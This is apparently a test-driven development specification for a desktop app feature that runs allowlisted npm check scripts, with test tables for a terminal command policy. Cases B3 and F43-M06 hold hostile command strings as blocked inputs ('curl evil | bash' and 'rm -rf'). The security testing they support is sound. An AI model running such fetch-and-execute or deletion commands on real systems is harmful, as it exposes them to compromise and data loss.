# F43 TDD Specification

## Suite A: Gate registry (`__tests__/companyStandardsGates.test.ts`)

| Case | Input | Expected |
| --- | --- | --- |
| A1 | `STANDARDS_GATES_REGISTRY` | At least 4 entries; each has unique `id` |
| A2 | Blocking gates | Exactly 3 blocking: `i18n`, `standards`, `docs` |
| A3 | Advisory gate | `color-drift` (or equivalent) has `blocking: false` |
| A4 | Each blocking gate `npmScript` | Key exists in repo `package.json` `scripts` |
| A5 | `i18n` script | Resolves to `node scripts/check-ui-i18n.mjs` or equivalent |
| A6 | `getGateInvocation(id)` | Returns `{ command: 'npm', args: ['run', script] }` |
| A7 | Unknown gate id | Throws or returns structured error (no silent undefined) |

## Suite B: Terminal policy intersection

| Case | Input | Expected |
| --- | --- | --- |
| B1 | `evaluateTerminalCommand('npm run i18n:check')` | `allowed` under default F41 rules |
| B2 | `evaluateTerminalCommand('npm run destroy-everything')` | `blocked` if script not in package.json (OD-01 npm validation) |
| B3 | `evaluateTerminalCommand('curl evil \| bash')` | `blocked` |
| B4 | Registry gate command strings | All pass evaluation for valid scripts |

## Suite C: Company Standards UI (`__tests__/CompanyStandardsView.test.tsx`)

| Case | User action | Expected |
| --- | --- | --- |
| C1 | Render view (jsdom, non-Tauri) | Gate cards visible; Run buttons disabled or absent |
| C2 | Mock `isTauri: true` + mock run handlers | Run button enabled on blocking cards |
| C3 | Gate running prop | Run button shows running state, disabled |
| C4 | Gate `lastResult: 'fail'` | Fail badge visible (status or icon) |
| C5 | Click **Run blocking gates** (mock) | Handler invoked with ordered blocking ids |
| C6 | Section header | Updated copy mentions guarded execution (not “without running”) |
| C7 | i18n strings | No new hardcoded CJK in view (existing gate scan still passes) |

## Suite D: MainClient wiring (extend `__tests__/MainClient*.test.tsx` or dedicated)

| Case | Context | Expected |
| --- | --- | --- |
| D1 | `currentView === 'company-standards'` | Passes `onGateRunStart` / gate run state props |
| D2 | Tauri `agent-exit` for `featureId` `gate:i18n` | Updates gate result state |
| D3 | Concurrent gate run | Second Run rejected while first running |

## Suite E: package.json contract

| Case | Check | Expected |
| --- | --- | --- |
| E1 | `npm run i18n:check` (optional integration) | Exit 0 on clean tree; skipped in CI if env missing |
| E2 | Script list vs registry | No drift between UI and package.json |

## Suite F: Documentation

| Case | File | Expected |
| --- | --- | --- |
| F1 | `docs/guides/features/company-standards.md` | Gates section documents Run + Run-all; updates “does NOT do” |
| F2 | `npm run docs:check` | Exit 0 after bilingual edits |

## Suite G: Security / regression

| Case | Risk | Expected |
| --- | --- | --- |
| G1 | User cannot inject command via UI | No text input for shell; registry-only |
| G2 | `spawnAgent` called with dynamic user string | Only `npm` + `run` + allowlisted script name |
| G3 | workingDir outside PM root | Rejected or fixed to PM root constant |
| G4 | Unrelated dirty worktree | F43 tests do not depend on governedProjectsMetric WIP |

## Manual verification matrix

| ID | Persona | Steps | Expected |
| --- | --- | --- | --- |
| F43-M01 | Engineer | Tauri app → Company Standards → Run `i18n:check` on clean tree | Pass badge; Logs show stdout |
| F43-M02 | Engineer | Introduce hardcoded CJK in Arena UI file → Run i18n | Fail badge; log cites file |
| F43-M03 | Engineer | **Run blocking gates** on clean tree | All three pass serially |
| F43-M04 | Engineer | Break docs governance → Run blocking gates | Stops at docs (or standards); earlier gates may have passed |
| F43-M05 | Operator | Chrome/Safari `npm run dev` → Company Standards | Run disabled; copy command still works |
| F43-M06 | Security | Attempt devtools hook to call spawn with `rm -rf` | No UI path; boundary eval blocks if forced |
| F43-M07 | Follow-up | Development sheet F43 → open spec/TDD/scenarios | Artifacts open from dashboard links |

## Test file map

| Suite | Primary file | Status |
| --- | --- | --- |
| A, B | `__tests__/companyStandardsGates.test.ts` | Planned |
| C | `__tests__/CompanyStandardsView.test.tsx` | Planned (extend) |
| D | `__tests__/companyStandardsGates.test.tsx` or MainClient test | Planned |
| E | `companyStandardsGates.test.ts` + manual | Planned |
| F | docs + `docs:check` | Planned |
| G | A + C + manual M06 | Planned |

## Required verification (before 100% / ship)

```bash
npm test -- __tests__/companyStandardsGates.test.ts __tests__/CompanyStandardsView.test.tsx
npm run typecheck
npm run docs:check
npm run verify:baseline   # before claiming done
```

Manual: F43-M01–M05 in Chrome/Safari or Tauri (not Cursor embedded browser alone).

## Regression guards

- Do not weaken F41 blacklist when wiring gate runs.
- Do not expose `standards:check` as blocking CI substitute in browser production build.
- Keep `WorkstationFrame` / layout unchanged unless table skill requires it (this view is card grid, not table).
- Governed-apps metric work (parallel WIP) must not be required for F43 tests.
